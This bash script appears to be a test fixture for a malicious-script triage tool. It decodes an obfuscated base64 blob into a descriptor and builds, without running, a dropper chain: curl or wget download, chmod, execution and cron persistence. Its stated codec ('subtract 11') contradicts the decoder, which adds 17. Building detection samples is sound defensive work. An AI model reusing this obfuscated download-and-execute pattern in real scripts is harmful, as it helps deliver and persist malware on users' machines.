#!/usr/bin/env bash
  # Huntress Script Triage -- inert static-analysis fixture (bash_linux)
  readonly Material_1bdfb513='ZSwga2JjVF9iLF9hXlVYW1ROV15iYxtQUmBkWGFUTmFUXF5jVBtmYVhjVE5VWFtUG1JXUF1WVE5cXlNUG1NYYl9QY1JXTl9hXlJUYmJrUFNQX2NUYSxmVlRjTlBhUldOVVBbW1FQUlprYmNQVlROUl5kXWMsJGtSUFxfUFhWXU5YUyxSUFxfUFhWXRwoJh9UIlIiIVBSa2RhWyxXY2NfYikeHigmH1QiUiIhUFIdVGdQXF9bVB1YXWVQW1hTHighJCUhJlQkHWJXa2RiVGFOUFZUXWMsN2RdY2FUYmI7UFEeKCYfVCJSIiFQUmtVWFtUTl9QY1csHmNcXx5XZF1jYVRiYhxSUFJXVB4dYmNQVlQcKCYfVCJSIiFQUmtQYVJXTl9hXlFULGRdUFxUHFxrYlRhZVhSVE5dUFxULGRfU1BjVBwoJh9UIlIiIVBSHWJUYWVYUlRrUmFeXU5fUGNXLB5UY1IeUmFeXR1THmRfU1BjVBwoJh9UIlIiIVBS'
  readonly Codec_1bdfb513='base64_literal|subtract_modulo_256|11'

  Load_1bdfb513() {
    stored_bytes=()
    local encoded_part
    while read -r encoded_part; do [[ -n "$encoded_part" ]] && stored_bytes+=("$encoded_part"); done < <(printf '%s' "${Material_1bdfb513}" | base64 --decode | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d')
  }

  Decode_1bdfb513() {
    recovered_bytes=()
    local byte_index
    for ((byte_index=0; byte_index<${#stored_bytes[@]}; byte_index++)); do
      recovered_bytes+=("$(((stored_bytes[byte_index] + 17) % 256))")
    done
  }

  Recover_1bdfb513() {
    local -a stored_bytes recovered_bytes
    local configuration_text harmless_value decode_pass byte_index
    if ((2 > 1)); then harmless_value=left; else harmless_value=right; fi
    Load_1bdfb513
    Decode_1bdfb513
    configuration_text=''
    local octal character
    for byte_index in "${!recovered_bytes[@]}"; do
      printf -v octal '%03o' "${recovered_bytes[byte_index]}"
      printf -v character '%b' "\\$octal"
      configuration_text+="$character"
    done
    printf '%s\n' "$configuration_text"
  }

  Inspect_1bdfb513() { Recover_1bdfb513; }

  Plan_1bdfb513() {
    local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
    descriptor="$(Inspect_1bdfb513)"
    local -a fields
    IFS='|' read -r -a fields <<< "$descriptor"
    for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
    local -a profile_command=(uname -m) request_primary=(curl --fail --silent --show-error -o "$file_path" "$url") request_fallback=(wget -qO "$file_path" "$url") permission_command=(chmod 0700 "$file_path") launch_command=("$file_path") cron_descriptor=(printf '%s' "$cron_path" "$service_name")
    declare -p profile_command request_primary request_fallback permission_command launch_command cron_descriptor
  }

  if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_1bdfb513; fi
